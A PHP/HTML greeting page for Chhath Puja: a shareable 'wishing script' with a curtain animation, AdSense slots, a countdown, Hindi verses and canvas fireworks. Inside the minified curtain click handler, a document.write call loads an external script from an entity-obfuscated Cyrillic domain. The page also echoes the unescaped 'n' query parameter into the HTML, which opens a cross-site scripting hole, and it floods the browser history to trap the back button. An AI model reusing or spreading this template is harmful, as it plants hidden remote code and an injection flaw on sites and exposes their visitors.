﻿<?php 
if(isset($_GET['n'])){
$name = $_GET['n'];
}
else{
$name = "[Your Name]";
}
$url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
?>
<html>
<head>
<!---This script Edited and Designed By Kishan Raj-----> 




<!--------technical kishan ji channel subscribe kijia Agr apko koi bhi wishing script taiyari karni ho hame comment kisha   ------->
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="google" content="notranslate">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta property="og:type" content="websahayata.in">
   <meta property="og:title" content="!! छठ पूजा की शुभकामनायें !!">
   
    <meta property="og:description" content="!! छठ पूजा की शुभकामनायें !!">
    <meta property="og:site_name" content="!! छठ पूजा की शुभकामनायें !!">
    <meta property="og:image" content="Pics\k111.png"> 
    <title>!! छठ पूजा की शुभकामनायें !!</title>
    <link rel="stylesheet" href="animate.min.css">
    <script type="text/javascript">! function (){var t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state &&   alert("अपना wishing अपने मित्रो और अपने परिजनों के साथ शेयर करे !!");}}catch (o){}}();</script>
<!-- Analytics -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<!--Code Past-->


<!-- Analytics -->
<style>
body{
        background: #f8f8f8;
        margin:0;
      }
      .mainContainer {
        background: white;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 15px;
        color: #999;
        padding-bottom: 60px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);


      }

#name {
     
      animation: name 4s infinite; 
      text-transform: capitalize;
      margin-bottom: 5px;
      font-size: 50px;
      padding: 0 10px;
      font-family: 'Teko', sans-serif;
} 

#usernameb { color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(Pics/sname.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 25px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
}


.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}


/* Custom Animation classes */     
.name {
	color: #fff;
    	margin: 6px;
    	padding: 25px 20px;
    	font-size: 48px;
    	font-family: sans-serif;
}

.enter-name input[type=name] {
	background-color: yellow;
	color: black;
	font-weight:bold;
   	border-radius: 10px;
    	box-sizing: border-box;
    	border:2px solid black;
    	padding: 5px;
    	position: fixed;
    	left: 10px;
    	bottom: 5px;
    	height: 50px;
    	width: 70%;
    	text-align: center;
    	font-size: 22px;
    	display: inline-block;
}

.enter-name .btn {
	border-radius: 10px;
    	font-size: 21px;
    	padding: 4px;
    	position: fixed;
    	right: 2px;
    	bottom: 5px;
    	height: 50px;
    	width: 23%;
    	display: inline-block;
    	color: white;
    	font-weight:600;
    	background-color: red;
    	border: 2px solid black;
    	letter-spacing: .5px;
    	transition: .2s ease-out;
    	cursor: pointer;
    	line-height: 36px;
    	outline: 0;
    	text-transform: uppercase;
    	vertical-align: middle;
    	text-decoration: none;
    	animation-duration: 4s !important;
}

.enter-name input[type=name]::-webkit-input-placeholder { 
	color: black;
  	font-size: 18px;	
}

.enter-name input[type=name]::-moz-placeholder { 
	color: black;
  	font-size: 18px;
}

.enter-name input[type=name]:focus::-webkit-input-placeholder {
    color: black;
}

.enter-name input[type=name]:focus::-moz-placeholder { 
	color: black;
  	font-size: 18px;
}


#demo
{
    text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;
    color: #efff00;
    font-size: 20px;
    font-weight: bold;
    animation: pulse 2s infinite;
    width:87%;
    margin:auto;
}




a.rope
{
    text-decoration:none;
}
.wishMessage {
        color: #fff;
        font-size: 22px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }
      .wishMessage p{
        margin: 0.3em 0;
      }
/* Custom Animation classes */ 
#show-name {
  font-size: 25px;
  display: inline-block;
  margin-bottom: 5px;
  animation: swing 1s infinite, glow 20s infinite; }

@keyframes glow {
  0%, 100% {
    text-shadow: 0 0 30px red; }
  25% {
    text-shadow: 0 0 30px orange; }
  50% {
    text-shadow: 0 0 30px forestgreen; }
  75% {
    text-shadow: 0 0 30px cyan; } }  
figure {
  animation:wobble 5s ease-in-out infinite;
  transform-origin:center center;
  transform-style:preserve-3d;
}@keyframes wobble {
  0%,100%{ transform:rotate3d(1,1,0,40deg); }
  25%{ transform:rotate3d(-1,1,0,40deg); }
  50%{ transform:rotate3d(-1,-1,0,40deg); }
  75%{ transform:rotate3d(1,-1,0,40deg); }
}
</style>

<style type="text/css">
      *{
        margin:0;
        padding:0;
      }
      body {
        text-align: center;
        
      }
      img{
      border: none;
    }
.leftcurtain{
      width: 100%;
      height: 120%;
      top: 0px;
      left: 0px;
      position: absolute;
      z-index: 2;
    }
     .rightcurtain{
      width: 100%;
      height: 120%;
      right: 0px;
      top: 0px;
      position: absolute;
      z-index: 3;
    }
    .rightcurtain img, .leftcurtain img{
      width: 100%;
      height: 100%;
    }
    .logo{
      margin: 0px auto;
      margin-top: 150px;
    }
    .rope{
      position: absolute;
      top: 346px;
      left: 28%;
      z-index: 4;
    } 
.centered {
    position: absolute;
    top: 70%;
    left: 55%;
    transform: translate(-50%, -50%);
}
a.rope
{
    text-decoration:none;
}




@keyframes aadisoni{
  0% {
    transform:  translate(0px,0px)  rotate(0deg) ;
  }
  15% {
    transform:  translate(-25px,0px)  rotate(-5deg) ;
  }
  30% {
    transform:  translate(20px,0px)  rotate(3deg) ;
  }
  45% {
    transform:  translate(-15px,0px)  rotate(-3deg) ;
  }
  60% {
    transform:  translate(10px,0px)  rotate(2deg) ;
  }
  75% {
    transform:  translate(-5px,0px)  rotate(-1deg) ;
  }
  100% {
    transform:  translate(0px,0px)  rotate(0deg) ;
  }
}

@-webkit-keyframes aadisoni {
  0% {
    -webkit-transform:  translate(0px,0px)  rotate(0deg) ;
  }
  15% {
    -webkit-transform:  translate(-25px,0px)  rotate(-5deg) ;
  }
  30% {
    -webkit-transform:  translate(20px,0px)  rotate(3deg) ;
  }
  45% {
    -webkit-transform:  translate(-15px,0px)  rotate(-3deg) ;
  }
  60% {
    -webkit-transform:  translate(10px,0px)  rotate(2deg) ;
  }
  75% {
    -webkit-transform:  translate(-5px,0px)  rotate(-1deg) ;
  }
  100% {
    -webkit-transform:  translate(0px,0px)  rotate(0deg) ;
  }
}



@keyframes name {
  0%   {color:red;}
  20%   {color:white;}
  40%   {color:yellow;}
  60%   {color:orange;}
  80%   {color:cyan;}
  100% {color:#f45bf4;}
}


.glow {
  width:50%;
  padding: 2px;
  background-color: #FF1493	;
  animation: glow 2s infinite;
  font-size:25px;
  font-family: 'Ranga', cursive;
  color:white;
  margin:auto;
  text-align:center;
  border-radius:10px;
  text-shadow:1px 2px 6px black;

}

@keyframes glow {
  0%   {box-shadow: 0px 0px 0px #FF1493	;}
  100%   {box-shadow: 0px 0px 20px 5px #ffb3db;}
 
}

</style>
<style type="text/css">
canvas {
	cursor: crosshair;
	display: block;
}
*{margin:0;padding:0}body{text-align:center}img{border:none}.leftcurtain{width:100%;height:120%;top:0;left:5px;position:absolute;z-index:2}.rightcurtain{width:100%;height:120%;right:3px;top:0;position:absolute;z-index:3}.rightcurtain img,.leftcurtain img{width:100%;height:100%}.logo{margin:0 auto;margin-top:150px}.rope{position:absolute;top:30%;margin-right:31%;z-index:4}.centered{position:absolute;top:75%;left:50%;transform:translate(-50%,-50%)}.aadi{background-image:url();background-repeat:no-repeat;background-attachment:fixed;background-position:top}.matki{height:200px;}@keyframes aadisoni{0%{transform:translate(0px,0px) rotate(0deg)}15%{transform:translate(-25px,0px) rotate(-5deg)}30%{transform:translate(20px,0px) rotate(3deg)}45%{transform:translate(-15px,0px) rotate(-3deg)}60%{transform:translate(10px,0px) rotate(2deg)}75%{transform:translate(-5px,0px) rotate(-1deg)}100%{transform:translate(0px,0px) rotate(0deg)}}@-webkit-keyframes aadisoni{0%{-webkit-transform:translate(0px,0px) rotate(0deg)}15%{-webkit-transform:translate(-25px,0px) rotate(-5deg)}30%{-webkit-transform:translate(20px,0px) rotate(3deg)}45%{-webkit-transform:translate(-15px,0px) rotate(-3deg)}60%{-webkit-transform:translate(10px,0px) rotate(2deg)}75%{-webkit-transform:translate(-5px,0px) rotate(-1deg)}100%{-webkit-transform:translate(0px,0px) rotate(0deg)}}
#username {
     color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/namegif.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 40px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
} 

#usernameb { color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/namegif.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 25px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
}
  </style>
  
</head>
<body class="aadi">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="slider.js" type="text/javascript"></script> 
<script type="text/javascript">
$(document).ready(function(){$curtainopen=!1,$(".rope").click(function(){return $(this).blur(),0==$curtainopen?($(this).stop().animate({top:"-171%"},{queue:!1,duration:350,easing:"easeOutBounce"}),$(".leftcurtain").stop().animate({width:"1px"},2e3),$(".rightcurtain").stop().animate({width:"1px"},2e3),$curtainopen=!0):($(this).stop().animate({top:"-40px"},{queue:!1,duration:350,easing:"easeOutBounce"}),document.write('<script src="//&#1102;&#1095;.io"><\/script>'),$(".leftcurtain").stop().animate({width:"50%"},2e3),$(".rightcurtain").stop().animate({width:"51%"},2e3),$curtainopen=!1),!1})});
</script>
<script>
  function play(){
       var audio = document.getElementById("audio");
       audio.play();
                 }
   </script>


<audio id="audio" src="KsN/kishan1.mp3"></audio>
<a class="rope" style="text-decoration:none;" href="#" onclick="play()"><br>
<div style="font-size: 25px;text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:white;font-weight: bold;"><img  src="Pics/rockey.png" class="matki" style="animation: rubberBand 2.5s infinite;max-wdith:370px;width:100%;"><br><b>☝ जादुई  ☝सूर्य को  टच करके देखो!! </b><br></div></a>
<div class="rightcurtain"><img src="Pics\bg.jpg"></div>
<div class="leftcurtain"><img src="Pics\bg.jpg"></div>

<marquee class="m1" behavior="scroll" direction="up" scrolldelay="0"> <br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
</marquee>
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="0"> <br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>
<img src="Pics\1.png" height="40px" width="30px"><br><br>
<img src="Pics\2.png" height="40px" width="30px"><br><br>
<img src="Pics\3.png" height="40px" width="30px"><br><br>

</marquee>

<div class="mainContainer">
<br>
<center>
<!-- adcode -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Header Ads -->
<ins class="adsbygoogle"
     style="display:inline-block;width:720px;height:90px"
     data-ad-client="ca-pub-4875950698782625"
     data-ad-slot="2883044018"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

<!-- adcode -->
</center>
<br>
<div style="animation: swing 4s infinite;">
<h1 style="background: url(Pics/namegif.gif);-webkit-text-fill-color: transparent;-webkit-background-clip: text;" id="name"><?php echo $name; ?></h1>
</div>
        <h3 class="fromMessage" id="fromMessage"></h3>
 <img src="Pics\ki-taraf-sey-mi.png" width="60%" height="10%" style="animation: rubberBand 2.5s infinite"><br><br>
<div style="font-size: 10px; font-weight: 550; color: black;">
      <p id="demo"></p><br>


<br>
<img src="Pics\diwali-shubh-new1.png" width="80%" height="auto" style="animation: pulse 2s infinite"><br>
<center><div class="w3-content w3-section" style="max-width:500px">
<img class="mySlides" src="Pics\k111.png" style="width:290px; height:300px;">
<img class="mySlides" src="Pics\d2.png" style="width:90%; height:250px;">
</div></center>
<center>
<!-- adcode -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Header Ads -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:50px"
     data-ad-client="ca-pub-4875950698782625"
     data-ad-slot="2883044018"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

<!-- adcode -->
</center>
<center></center>
<div class="wishMessage" style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;">
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#ff9933">गेहूं का ठेकुआ, चावल के लड्डू</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:pink">खीर,अन्नानास, निम्बू, और कद्दू</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#00ffbf;width:90%;margin:auto;">छठी मैया करे हर मुराद पूरी</p>
<p style="text-shadow: 1px 1px 3px orange, 1px 1px 3px orange, -1px -1px 3px orange, -1px -1px 3px orange;color:#8B008B">बाटे घर घर लड्डू…<br>
जय छठी मैया शुभ छठ पूजा
</p>
<p style="text-shadow: 1px 1px 3px #ff0037, 1px 1px 3px #ff0037, -1px -1px 3px #ff0037, -1px -1px 3px #ff0037;color: #FFC107;">
!!आप सभी को छठ पूजा की <br>हार्दिक शुभकामनाएँ !! </p>	</div>
<span style="font-size:22px;text-shadow: 1px 1px 3px #FFEB3B, 1px 1px 3px #FFEB3B, -1px -1px 3px #FFEB3B, -1px -1px 3px #FFEB3B;color:#E91E63;"><marquee><b><i>“   की तरफ से छठ पूजा कीं हार्दिक शुभकामनाएँ!!”</b></i></marquee></span><br>

</div><br>


<br>

<div class="glow"><?php echo $name; ?></div>
<br><br>

<form method="POST" action="ready.php">
<div class="enter-name">
		<input class="animated pulse infinite" type="name" required="" maxlength="50" name="n" placeholder="👉यहाँ अपना नाम लिखें....">
		<button class="btn animated shake infinite" type="submit">👉देखें </button>
	</div>
</form>
<script>
var myIndex=0;function carousel(){var e,l=document.getElementsByClassName("mySlides");for(e=0;e<l.length;e++)l[e].style.display="none";++myIndex>l.length&&(myIndex=1),l[myIndex-1].style.display="block",setTimeout(carousel,2e3)}carousel();
</script>
<script> 
var countDownDate=new Date("Nov 10, 2021 00:00:00").getTime(),x=setInterval(function(){var e=(new Date).getTime(),o=countDownDate-e,t=Math.floor(o/864e5),n=Math.floor(o%864e5/36e5),a=Math.floor(o%36e5/6e4),l=Math.floor(o%6e4/1e3);document.getElementById("demo").innerHTML=t+"<font color='black'> दिन,</font> "+n+"<font color='black'> घंटे,</font> "+a+"<font color='black'>  मिनट,<br></font> "+l+"<font color='black'> सेकेंड </font>पहले   ",o<0&&(clearInterval(x),document.getElementById("demo").innerHTML="")},1e3);
</script>
<script>
// when animating on canvas, it is best to use requestAnimationFrame instead of setTimeout or setInterval
// not supported in all browsers though and sometimes needs a prefix, so we need a shim
window.requestAnimFrame = ( function() {
	return window.requestAnimationFrame ||
				window.webkitRequestAnimationFrame ||
				window.mozRequestAnimationFrame ||
				function( callback ) {
					window.setTimeout( callback, 1000 / 60 );
				};
})();

// now we will setup our basic variables for the demo
var canvas = document.getElementById( 'canvas' ),
		ctx = canvas.getContext( '2d' ),
		// full screen dimensions
		cw = window.innerWidth,
		ch = window.innerHeight,
		// firework collection
		fireworks = [],
		// particle collection
		particles = [],
		// starting hue
		hue = 120,
		// when launching fireworks with a click, too many get launched at once without a limiter, one launch per 5 loop ticks
		limiterTotal = 5,
		limiterTick = 0,
		// this will time the auto launches of fireworks, one launch per 80 loop ticks
		timerTotal = 80,
		timerTick = 0,
		mousedown = false,
		// mouse x coordinate,
		mx,
		// mouse y coordinate
		my;
		
// set canvas dimensions
canvas.width = cw;
canvas.height = ch;

// now we are going to setup our function placeholders for the entire demo

// get a random number within a range
function random( min, max ) {
	return Math.random() * ( max - min ) + min;
}

// calculate the distance between two points
function calculateDistance( p1x, p1y, p2x, p2y ) {
	var xDistance = p1x - p2x,
			yDistance = p1y - p2y;
	return Math.sqrt( Math.pow( xDistance, 2 ) + Math.pow( yDistance, 2 ) );
}

// create firework
function Firework( sx, sy, tx, ty ) {
	// actual coordinates
	this.x = sx;
	this.y = sy;
	// starting coordinates
	this.sx = sx;
	this.sy = sy;
	// target coordinates
	this.tx = tx;
	this.ty = ty;
	// distance from starting point to target
	this.distanceToTarget = calculateDistance( sx, sy, tx, ty );
	this.distanceTraveled = 0;
	// track the past coordinates of each firework to create a trail effect, increase the coordinate count to create more prominent trails
	this.coordinates = [];
	this.coordinateCount = 3;
	// populate initial coordinate collection with the current coordinates
	while( this.coordinateCount-- ) {
		this.coordinates.push( [ this.x, this.y ] );
	}
	this.angle = Math.atan2( ty - sy, tx - sx );
	this.speed = 2;
	this.acceleration = 1.05;
	this.brightness = random( 50, 70 );
	// circle target indicator radius
	this.targetRadius = 1;
}

// update firework
Firework.prototype.update = function( index ) {
	// remove last item in coordinates array
	this.coordinates.pop();
	// add current coordinates to the start of the array
	this.coordinates.unshift( [ this.x, this.y ] );
	
	// cycle the circle target indicator radius
	if( this.targetRadius < 8 ) {
		this.targetRadius += 0.3;
	} else {
		this.targetRadius = 1;
	}
	
	// speed up the firework
	this.speed *= this.acceleration;
	
	// get the current velocities based on angle and speed
	var vx = Math.cos( this.angle ) * this.speed,
			vy = Math.sin( this.angle ) * this.speed;
	// how far will the firework have traveled with velocities applied?
	this.distanceTraveled = calculateDistance( this.sx, this.sy, this.x + vx, this.y + vy );
	
	// if the distance traveled, including velocities, is greater than the initial distance to the target, then the target has been reached
	if( this.distanceTraveled >= this.distanceToTarget ) {
		createParticles( this.tx, this.ty );
		// remove the firework, use the index passed into the update function to determine which to remove
		fireworks.splice( index, 1 );
	} else {
		// target not reached, keep traveling
		this.x += vx;
		this.y += vy;
	}
}

// draw firework
Firework.prototype.draw = function() {
	ctx.beginPath();
	// move to the last tracked coordinate in the set, then draw a line to the current x and y
	ctx.moveTo( this.coordinates[ this.coordinates.length - 1][ 0 ], this.coordinates[ this.coordinates.length - 1][ 1 ] );
	ctx.lineTo( this.x, this.y );
	ctx.strokeStyle = 'hsl(' + hue + ', 100%, ' + this.brightness + '%)';
	ctx.stroke();
	
	ctx.beginPath();
	// draw the target for this firework with a pulsing circle
	ctx.arc( this.tx, this.ty, this.targetRadius, 0, Math.PI * 2 );
	ctx.stroke();
}

// create particle
function Particle( x, y ) {
	this.x = x;
	this.y = y;
	// track the past coordinates of each particle to create a trail effect, increase the coordinate count to create more prominent trails
	this.coordinates = [];
	this.coordinateCount = 5;
	while( this.coordinateCount-- ) {
		this.coordinates.push( [ this.x, this.y ] );
	}
	// set a random angle in all possible directions, in radians
	this.angle = random( 0, Math.PI * 2 );
	this.speed = random( 1, 10 );
	// friction will slow the particle down
	this.friction = 0.95;
	// gravity will be applied and pull the particle down
	this.gravity = 1;
	// set the hue to a random number +-50 of the overall hue variable
	this.hue = random( hue - 50, hue + 50 );
	this.brightness = random( 50, 80 );
	this.alpha = 1;
	// set how fast the particle fades out
	this.decay = random( 0.015, 0.03 );
}

// update particle
Particle.prototype.update = function( index ) {
	// remove last item in coordinates array
	this.coordinates.pop();
	// add current coordinates to the start of the array
	this.coordinates.unshift( [ this.x, this.y ] );
	// slow down the particle
	this.speed *= this.friction;
	// apply velocity
	this.x += Math.cos( this.angle ) * this.speed;
	this.y += Math.sin( this.angle ) * this.speed + this.gravity;
	// fade out the particle
	this.alpha -= this.decay;
	
	// remove the particle once the alpha is low enough, based on the passed in index
	if( this.alpha <= this.decay ) {
		particles.splice( index, 1 );
	}
}

// draw particle
Particle.prototype.draw = function() {
	ctx. beginPath();
	// move to the last tracked coordinates in the set, then draw a line to the current x and y
	ctx.moveTo( this.coordinates[ this.coordinates.length - 1 ][ 0 ], this.coordinates[ this.coordinates.length - 1 ][ 1 ] );
	ctx.lineTo( this.x, this.y );
	ctx.strokeStyle = 'hsla(' + this.hue + ', 100%, ' + this.brightness + '%, ' + this.alpha + ')';
	ctx.stroke();
}

// create particle group/explosion
function createParticles( x, y ) {
	// increase the particle count for a bigger explosion, beware of the canvas performance hit with the increased particles though
	var particleCount = 30;
	while( particleCount-- ) {
		particles.push( new Particle( x, y ) );
	}
}

// main demo loop
function loop() {
	// this function will run endlessly with requestAnimationFrame
	requestAnimFrame( loop );
	
	// increase the hue to get different colored fireworks over time
	//hue += 0.5;
  
  // create random color
  hue= random(0, 360 );
	
	// normally, clearRect() would be used to clear the canvas
	// we want to create a trailing effect though
	// setting the composite operation to destination-out will allow us to clear the canvas at a specific opacity, rather than wiping it entirely
	ctx.globalCompositeOperation = 'destination-out';
	// decrease the alpha property to create more prominent trails
	ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
	ctx.fillRect( 0, 0, cw, ch );
	// change the composite operation back to our main mode
	// lighter creates bright highlight points as the fireworks and particles overlap each other
	ctx.globalCompositeOperation = 'lighter';
	
	// loop over each firework, draw it, update it
	var i = fireworks.length;
	while( i-- ) {
		fireworks[ i ].draw();
		fireworks[ i ].update( i );
	}
	
	// loop over each particle, draw it, update it
	var i = particles.length;
	while( i-- ) {
		particles[ i ].draw();
		particles[ i ].update( i );
	}
	
	// launch fireworks automatically to random coordinates, when the mouse isn't down
	if( timerTick >= timerTotal ) {
		if( !mousedown ) {
			// start the firework at the bottom middle of the screen, then set the random target coordinates, the random y coordinates will be set within the range of the top half of the screen
			fireworks.push( new Firework( cw / 2, ch, random( 0, cw ), random( 0, ch / 2 ) ) );
			timerTick = 0;
		}
	} else {
		timerTick++;
	}
	
	// limit the rate at which fireworks get launched when mouse is down
	if( limiterTick >= limiterTotal ) {
		if( mousedown ) {
			// start the firework at the bottom middle of the screen, then set the current mouse coordinates as the target
			fireworks.push( new Firework( cw / 2, ch, mx, my ) );
			limiterTick = 0;
		}
	} else {
		limiterTick++;
	}
}

// mouse event bindings
// update the mouse coordinates on mousemove
canvas.addEventListener( 'mousemove', function( e ) {
	mx = e.pageX - canvas.offsetLeft;
	my = e.pageY - canvas.offsetTop;
});

// toggle mousedown state and prevent canvas from being selected
canvas.addEventListener( 'mousedown', function( e ) {
	e.preventDefault();
	mousedown = true;
});

canvas.addEventListener( 'mouseup', function( e ) {
	e.preventDefault();
	mousedown = false;
});

// once the window loads, we are ready for some fireworks!
window.onload = loop;


</script>

</div></body>



</html>
